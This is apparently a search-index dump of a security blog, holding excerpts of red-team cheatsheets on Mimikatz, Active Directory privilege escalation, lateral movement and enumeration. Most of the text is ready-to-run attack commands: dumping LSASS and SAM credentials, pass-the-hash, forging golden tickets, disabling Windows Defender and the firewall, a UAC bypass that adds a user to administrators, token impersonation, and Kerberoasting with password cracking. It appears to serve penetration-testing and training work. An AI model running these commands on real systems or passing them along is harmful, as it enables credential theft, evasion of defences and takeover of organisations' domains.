\u0026#34;lsadump::cache\u0026#34;\u0026#39;\t# Cached credentials :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::logonpasswords mimikatz # lsadump::sam mimikatz # lsadump::secrets mimikatz # lsadump::cache mimikatz # vault::list mimikatz # vault::cred mimikatz # vault::cred /patch Dump credentials on multiple remote machines (needs administrator rights on remote machines):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -DumpCreds -ComputerName @(\u0026#34;COMPUTER1\u0026#34;, \u0026#34;COMPUTER2\u0026#34;) ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061: The required privilege is not held by the client (mostly you’re not an administrator).\nERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005): No rights to access the LSASS process.\nExtract in-memory credentials from a minidump of a local machine (needs local administrator rights):\n:: procdump.exe :: On the remote machine (needs local admin rights) .\\procdump.exe -accepteula -ma lsass.exe c:\\users\\public\\dump.dmp 2\u0026gt;\u0026amp;1 :: mimikatz.exe :: On the local machine after the reception of the minidump file dump.dmp mimikatz # sekurlsa::minidump dump.dmp mimikatz # sekurlsa::logonpasswords Extract SAM credentials from a local machine without Mimikatz (needs local administrator rights):\n:: procdump.exe :: On the remote machine (needs local admin rights) reg save hklm\\system SYSTEM.sav reg save hklm\\sam SAM.sav reg save hklm\\security SECURITY.sav Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::sam /sam:SAM.sav /system:SYSTEM.sav\u0026#34;\u0026#39; or:\n# Impacket # On a local kali machine impacket-secretsdump -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL Extract tickets relative to all users on a machine:\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets /export\u0026#34;\u0026#39; Inject the ticket of interest in the current user session:\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt [0;82f8f7]-2-0-60a10000-dbprodadmin@krbtgt-US.FUNCORP.LOCAL.kirbi\u0026#34;\u0026#39; } Execute mimikatz to get krbtgt hash (must be specified DC as ComputerName and requires Domain Admin privileges):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; :: mimikatz.exe :: To be executed on domain controller mimikatz # lsadump::lsa /patch Pass-the-Hash “Pass-the-Hash” inject a hash for a machine local administrator (needs local administrator rights). Once you get the NTLM hash of the RID 500 remote machine Administrator it is possible to inject it into a session:\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\u0026#34;\u0026#39; :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe mimikatz # sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe and the open a SYSTEM shell by psexec:\npsexec.exe \\\\COMPUTER1 cmd Over-Pass-the-Hash “Over-Pass-the-Hash” generate tokens from hashes (needs local administrator rights):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe\u0026#34;\u0026#39; :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe Golden Ticket Generate a TGT encripted with krbtgt hash valid for every user:\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt\u0026#34;\u0026#39; :: mimikatz.exe mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt Golden Ticket Parameters\nParameter Optional Description /user No Username for which the TGT is generated /domain No Domain FQDN /sid No SID of the domain /krbtgt No NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys /sids Yes Additional …","date":1659830400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1659830400,"objectID":"643a7f6a60b62ee737414f98d62667fc","permalink":"https://www.peco602.com/post/0030-mimikatz-cheatsheet/","publishdate":"2022-08-07T00:00:00Z","relpermalink":"/post/0030-mimikatz-cheatsheet/","section":"post","summary":"Welcome 👋 We know that first impressions are important, so we've populated your new site with some initial content to help you get familiar with everything in no time.","tags":["Red Team","Windows","Active Directory","Mimikatz"],"title":"Mimikatz Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Windows Defender # Disable Windows Defender Set-MpPreference -DisableRealtimeMonitoring $true Set-MpPreference -DisableIOAVProtection $true # Disable Firewall ## cmd.exe netsh advfirewall set allprofiles state off ## powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False User Account Control (UAC) In case you are a member of the local administrators group, but you still have the Medium Mandatory Level label, it is necessary to bypass the User Account Control (UAC):\n# FodhelperUACBypass.ps1 . .\\FodhelperUACBypass.ps1 FodhelperUACBypass -program \u0026#34;cmd.exe\u0026#34; FodhelperUACBypass -program \u0026#34;cmd.exe /c powershell.exe\u0026#34; FodhelperUACBypass -program \u0026#34;cmd.exe /c net localgroup administrators CYBERLAB\\STUDENT01 /add\u0026#34; Alternatively, you can use SharpBypassUAC.\nToken Manipulation Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.\nIncognito # A SYSTEM shell is required .\\PsExec64.exe -s -i -d powershell.exe # Show tokens on the machine .\\incognito.exe list_tokens -u # Start new process with token of a specific user .\\incognito.exe execute \u0026#34;CYBERLAB\\STUDENT2\u0026#34; C:\\Windows\\system32\\calc.exe .\\incognito.exe execute -c \u0026#34;CYBERLAB\\STUDENT2\u0026#34; powershell.exe Invoke-TokenManipulation # Show all tokens on the machine Invoke-TokenManipulation -ShowAll # Show only unique, usable tokens on the machine Invoke-TokenManipulation -Enumerate # Start new process with token of a specific user Invoke-TokenManipulation -ImpersonateUser -Username \u0026#34;CYBERLAB\\STUDENT2\u0026#34; # Start new process with token of another process Invoke-TokenManipulation -CreateProcess \u0026#34;C:\\Windows\\system32\\calc.exe\u0026#34; -ProcessId 500 Classic Kerberoasting Find user accounts used as Service accounts:\n# PowerView Get-NetUser -SPN # ActiveDirectory Module Get-ADUser -Filter {ServicePrincipalName -ne \u0026#34;$null\u0026#34;} -Properties ServicePrincipalName Request a Ticket Granting Service (TGS):\n# PowerShell Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;MSSQLSvc/database.cyberlab.cybercorp.local\u0026#34; # PowerView Request-SPNTicket -SPN \u0026#34;MSSQLSvc/database.cyberlab.cybercorp.local\u0026#34; Check if the TGS has been granted:\nklist Export all tickets using Mimikatz\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::list /export\u0026#34;\u0026#39; Crack the Service account password (this step can be performed on a Kali machine):\n# tgsrepcrack.py git clone https://github.com/nidem/kerberoast python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi the same TGS can also be cracked by using john, but it must be firstly converted into a compatible format:\n# tgsrepcrack.py python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi # JohnTheRipper /usr/sbin/john --format=krb5tgs ./tgs.john --wordlist=./10-million-password-list-top-1000000.txt An alternative way to perform Kerberoasting is to use PowerSploit combined to john or hashcat:\nFind user accounts used as Service accounts:\n# PowerView Get-NetUser -SPN # ActiveDirectory Module Get-ADUser -Filter {ServicePrincipalName -ne \u0026#34;$null\u0026#34;} -Properties ServicePrincipalName Request a TGS:\n# Invoke-Kerberoast.ps1 ## JohnTheRipper (bleeding-jumbo branch) Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII john_tgs.kirbi ## HashCat Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashcat_tgs.kirbi Brute-force the exported ticket:\n# JohnTheRipper (bleeding-jumbo branch) john --format=krb5tgs --wordlist=./10-million-password-list-top-1000000.txt john_tgs.kirbi # HashCat hashcat -m 13100 --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt The hashcat format can also be cracked by john.\nTargeted Kerberoasting (Set SPN) With enough rights (GenericAll/GenericWrite), a target user’s SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.\nLet’s enumerate the permissions for RDPUsers on ACLs\n# PowerView Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match \u0026#34;RDPUsers\u0026#34;} Check if the user already has a SPN:\n# PowerView_dev Get-DomainUser -Identity \u0026#34;STUDENT2\u0026#34; | select ServicePrincipalName # ActiveDirectory Module Get-ADUser -Identity \u0026#34;STUDENT2\u0026#34; -Properties ServicePrincipalName | select ServicePrincipalName Set a SPN for the user (must be unique for the domain):\n# PowerView Set-DomainObject -Identity \u0026#34;STUDENT2\u0026#34; -Set @{serviceprincipalname=\u0026#39;ops/whatever1\u0026#39;} # ActiveDirectory Module Set-ADUser -Identity \u0026#34;STUDENT2\u0026#34; -ServicePrincipalNames @{Add=\u0026#39;ops/whatever1\u0026#39;} Request a TGS:\n# PowerShell Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;ops/whatever1\u0026#34; # PowerView …","date":1659225600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1659225600,"objectID":"381c01d401294235df85592b90ed62e8","permalink":"https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/","publishdate":"2022-07-31T00:00:00Z","relpermalink":"/post/0020-domain-privilege-escalation-cheatsheet/","section":"post","summary":"Privilege escalation is the process by which a user with limited access to the domain can increase the scope and scale of their access permissions.","tags":["Cheatsheet","Red Team","Windows","Active Directory","Privilege Escalation"],"title":"Domain Privilege Escalation Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Local Files Find local senstive files on computers:\n# PowerView Get-ChildItem -Filter *.xml -Path c:\\ -RecurseGet-ChildItem -Filter *unattend*.xml -Path c:\\ -Recurse AppLocker Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at LOLBAS if only signed binaries are allowed:\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections Port Scanning Check machine reachability:\nTest-NetConnection \u0026#34;COMPUTER1\u0026#34; -Port 3389 Perform a port scanning:\n# PowerSploit ## Open and filtered ports Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -TopPorts 200 | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;--- FILTERED ---\u0026#34;; echo $_.filteredPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -Ports \u0026#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901\u0026#34; | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;--- FILTERED ---\u0026#34;; echo $_.filteredPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} ## Only open ports Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -TopPorts 200 | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;}Invoke-Portscan -Hosts @(Get-NetComputer) -TopPorts 200 | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} Invoke-Portscan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -Ports \u0026#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901\u0026#34; | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} Invoke-Portscan -Hosts @(Get-NetComputer) -Ports \u0026#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985\u0026#34; | %{echo $_.Hostname; echo \u0026#34;--- OPEN ---\u0026#34;; echo $_.openPorts; echo \u0026#34;------------\u0026#34;; echo \u0026#34;\u0026#34;} ## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24) Port forwarding # Forward a port to another host/port net sh interface portproxy add v4tov4 listenport=80 listenaddress=192.168.1.9 connectport=5985 connectaddress=192.168.1.10 ## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth Set-Item wsman:\\localhost\\Client\\TrustedHosts -value * $securePassword = ConvertTo-SecureString \u0026#34;Password\u0026#34; -AsPlainText -force $credential = New-Object System.Management.Automation.PsCredential(\u0026#34;cyberlab\\STUDENT1\u0026#34;,$securePassword) Enter-PSSession -ComputerName 192.168.1.9 -Port 80 -Credential $securePassword # Show all forwardings netsh interface portproxy show all # Delete all forwardings netsh interface portproxy reset # Delete a specific forwardingnet sh interface portproxy delete v4tov4 listenport=80 listenaddress=192.168.1.9 PSRemoting Requires ‘HTTP’ and ‘WSMAN’ SPNs\nEnable PSRemoting on local machine and adds exception to the firewall:\nEnable-PSRemoting Create a PSSession:\n$sess = New-PSSession -ComputerName \u0026#34;COMPUTER1\u0026#34; -Credential \u0026#34;cyberlab\\STUDENT1\u0026#34; Enter a PSSession:\nEnter-PSSession -ComputerName \u0026#34;COMPUTER1\u0026#34;-Credential \u0026#34;cyberlab\\STUDENT1\u0026#34; -Session $sess Use below to execute commands or scriptblocks:\nInvoke-Command -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) -ScriptBlock {Get-Process} Invoke-Command -ComputerName \u0026#34;COMPUTER1\u0026#34; -ScriptBlock {whoami;hostname} Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):\n$securePassword = ConvertTo-SecureString \u0026#34;Password\u0026#34; -AsPlainText -Force $credential = New-Object System.Management.Automation.PsCredential(\u0026#34;cyberlab\\STUDENT1\u0026#34;,$securePassword) Invoke-Command -ComputerName \u0026#34;COMPUTER1\u0026#34; -ScriptBlock {whoami;hostname} -Credential $credential or to start a new session:\n$Sess = New-PSSession -Computername \u0026#34;COMPUTER1\u0026#34; -Credential $credentialInvoke-Command -Session $sess -ScriptBlock {whoami} Use below to execute scripts from files:\nInvoke-Command -FilePath \u0026#34;C:\\scripts\\Get-PassHashes.ps1\u0026#34; -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) Use below to execute locally loaded function on the remote machines:\nInvoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:\nInvoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content \u0026#34;.\\list_of_computers.txt\u0026#34;) -ArgumentList Execute “Stateful” commands using Invoke-Command:\n$Sess = New-PSSession -Computername \u0026#34;COMPUTER1\u0026#34;Invoke-Command -Session $Sess -ScriptBlock {$Proc = GetProcess}Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name} Copy files between PSRemoting sessions:\n$Sess = New-PSSession -Computername \u0026#34;COMPUTER1\u0026#34; Copy-Item -Path C:\\Users\\Public\\Inveigh-NTLMv2.txt -Destination C:\\Users\\user01\\Desktop\\ -FromSession $sess Copy-Item -Path C:\\Users\\user01\\Desktop\\mimikatz.exe …","date":1658620800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1658620800,"objectID":"44a4343245f8e67ac4def8907bbdaff7","permalink":"https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/","publishdate":"2022-07-24T00:00:00Z","relpermalink":"/post/0010-domain-lateral-movement-cheatsheet/","section":"post","summary":"Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets.","tags":["Cheatsheet","Red Team","Windows","Active Directory","Lateral Movement"],"title":"Domain Lateral Movement Cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security"],"content":"Module Import Load the PowerView module:\npowershell -ep bypass . .\\PowerView.ps1 or the ActiveDirectory module (to use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid ActiveDirectory module DLL):\nImport-Module .\\Microsoft.ActiveDirectory.Management.dll Import-Module .\\ActiveDirectory\\ActiveDirectory.psd1 It works also in case of ConstrainedLanguage Mode:\n$ExecutionContext.SessionState.LanguageMode Basic Enumeration Get current domain or trusted domain objects:\n# PowerView Get-NetDomain Get-NetDomain -Domain \u0026#34;cyberlab.cybercorp.local\u0026#34; Get-NetDomain -Domain \u0026#34;cybercorp.local\u0026#34; ## Get domain NetBios name (gwmi Win32_NTDomain).DomainName # ActiveDirectory Module Get-ADDomain Get-ADDomain -Identiy \u0026#34;cyberlab.cybercorp.local\u0026#34; Get-ADDomain -Identiy \u0026#34;cybercorp.local\u0026#34; Get domain SID for the current domain:\n# PowerView Get-DomainSID # ActiveDirectory Module (Get-ADDomain).DomainSID Get domain policy for the current domain or for a trusted domain:\n# PowerView Get-DomainPolicy (Get-DomainPolicy).\u0026#34;System Access\u0026#34; (Get-DomainPolicy).\u0026#34;Kerberos Policy\u0026#34; (Get-DomainPolicy -Domain \u0026#34;cybercorp.local\u0026#34;).\u0026#34;System Access\u0026#34; (Get-DomainPolicy -Domain \u0026#34;cybercorp.local\u0026#34;).\u0026#34;Kerberos Policy\u0026#34; Get Domain Controllers for the current or for a trusted domain:\n# PowerView Get-NetDomainController\tGet-NetDomainController\t-Domain \u0026#34;cybercorp.local\u0026#34; # ActiveDirectory Module Get-ADDomainController\tGet-ADDomainController -DomainName \u0026#34;cybercorp.local\u0026#34; -Discover Get the list of users in the current domain:\n# PowerView Get-NetUser Get-NetUser | select -ExpandProperty samaccountname Get-NetUser | select samaccountname,title,description,logoncount,pwdlastset Get-NetUser -Domain \u0026#34;cybercorp.local\u0026#34; | select -ExpandProperty samaccountname Get-NetUser -UserName \u0026#34;STUDENT1\u0026#34; # ActiveDirectory Module Get-ADUser -Filter * -Properties * Get-ADUser -Identity \u0026#34;STUDENT1\u0026#34; -Properties * ::cmd.exe net user /domain net user \u0026#34;STUDENT1\u0026#34; /domain Get list of all properties for users in the current domain:\n# PowerView Get-UserProperty\t# All properties Get-UserProperty -Properties \u0026#34;pwdlastset\u0026#34;\t# Only pwdlastset property # ActiveDirectory Module Get-ADUser -Filter * -Properties * Get-ADUser -Identity \u0026#34;STUDENT1\u0026#34; -Properties * Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType Property | select Name Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}\tSearch for a particular string in a users’ attribute:\n# PowerView Find-UserField -Verbose Find-UserField -SearchField \u0026#34;Description\u0026#34; -SearchTerm \u0026#34;built\u0026#34; # ActiveDirectory Module Get-ADUser -Filter \u0026#39;Description -like \u0026#34;*built*\u0026#34;\u0026#39; -Properties Description | select Name,Description Get a list of computers in the current domain:\n# PowerView Get-NetComputer Get-NetComputer -OperatingSystem \u0026#34;*Server 2016*\u0026#34; Get-NetComputer -Ping Get-NetComputer -FullData ## Get computer IPs Get-NetComputer | % {$name=$_; $ip=[System.Net.Dns]::GetHostAddresses($name).IPAddressToString; Write-Host $name \u0026#34;`t : \u0026#34; $ip } # ActiveDirectory Module Get-ADComputer -Filter * | select Name Get-ADComputer -Filter \u0026#39;OperatingSystem -like \u0026#34;*Server 2016*\u0026#34;\u0026#39; -Properties OperatingSystem | select Name,OperatingSystem Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} Get-ADComputer -Filter * -Properties * Search for a particular string in a computer attribute:\n# PowerView Find-ComputerField -SearchField \u0026#34;OperatingSystem\u0026#34; -SearchTerm \u0026#34;windows\u0026#34;\t# ActiveDirectory Module Get-ADComputer -Filter \u0026#39;Description -like \u0026#34;*built*\u0026#34;\u0026#39; -Properties Description | select name,Description Get groups in the current domain:\n# PowerView Get-NetGroup Get-NetGroup -GroupName \u0026#34;Domain Admins\u0026#34; -FullData Get-NetGroup -GroupName \u0026#34;Enterprise Admins\u0026#34; -FullData Get-NetGroup -GroupName \u0026#34;*admin*\u0026#34; # ActiveDirectory Module Get-ADGroup -Filter * Get-ADGroup -Filter \u0026#39;Name -like \u0026#34;*admin*\u0026#34;\u0026#39; | select Name ::cmd.exe net group /domain net group \u0026#34;Domain Admins\u0026#34; /domain Get all the members of a group:\n# PowerView Get-NetGroupMember -GroupName \u0026#34;Domain Admins\u0026#34; -Recurse Get-NetGroupMember -GroupName \u0026#34;Enterprise Admins\u0026#34; -Recurse # ActiveDirectory Module Get-ADGroupMember -Identity \u0026#34;Domain Admins\u0026#34; -Recursive\tGet-ADGroupMember -Identity \u0026#34;Enterprise Admins\u0026#34; -Recursive\tGet the group membership for a user:\n# PowerView Get-NetGroup -UserName \u0026#34;STUDENT1\u0026#34;\t# ActiveDirectory Module Get-ADPrincipalGroupMembership -Identity \u0026#34;STUDENT1\u0026#34; Get local groups on localhost or an specified computer (need local admin rights on the target):\n# PowerView Get-NetLocalGroup Get-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; Get-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; -ListGroups\tGet-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; -GroupName \u0026#34;Remote Desktop Users\u0026#34;\t:: cmd.exe net localgroup Get all effective local/domain users/groups that can access the machine with local administrative privileges:\n# PowerView Get-NetLocalGroup -ComputerName \u0026#34;COMPUTER1\u0026#34; -Recurse\tGet currently logged users on a computer (need …","date":1658016e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1658016e3,"objectID":"bebede30aad4cefc8f1f1c17ce5ead08","permalink":"https://www.peco602.com/post/0000-domain-enumeration-cheatsheet/","publishdate":"2022-07-17T00:00:00Z","relpermalink":"/post/0000-domain-enumeration-cheatsheet/","section":"post","summary":"Domain Enumeration is the process of extracting information from the Active Directory like enumerating the users, groups, and other interesting fields and resources.","tags":["Cheatsheet","Red Team","Windows","Active Directory","Enumeration"],"title":"Domain Enumeration Cheatsheet","type":"post"},{"authors":null,"categories":null,"content":"RedHerd is a collaborative and serverless framework for orchestrating a geographically distributed group of assets capable of conducting simulating complex offensive cyberspace operations.\nThe framework takes advantage of the “as a Service” paradigm in order to deploy a ready-to-use infrastructure that can also be adopted for effective training purposes, by reliably reproducing a real-world cyberspace scenario in which red and blue teams can challenge each other. RedHerd perfectly fits the Open Systems Architecture design pattern, thanks to the adoption of both open standards and wide-spread open source software components.\n","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1461715200,"objectID":"6a4f63692f75a616afcbaec133b4b317","permalink":"https://www.peco602.com/project/redherd/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/project/redherd/","section":"project","summary":"RedHerd is a collaborative and serverless framework for orchestrating a geographically distributed group of assets capable of conducting simulating complex offensive cyberspace operations.","tags":["Cyber","Red Team"],"title":"RedHerd Framework","type":"project"}]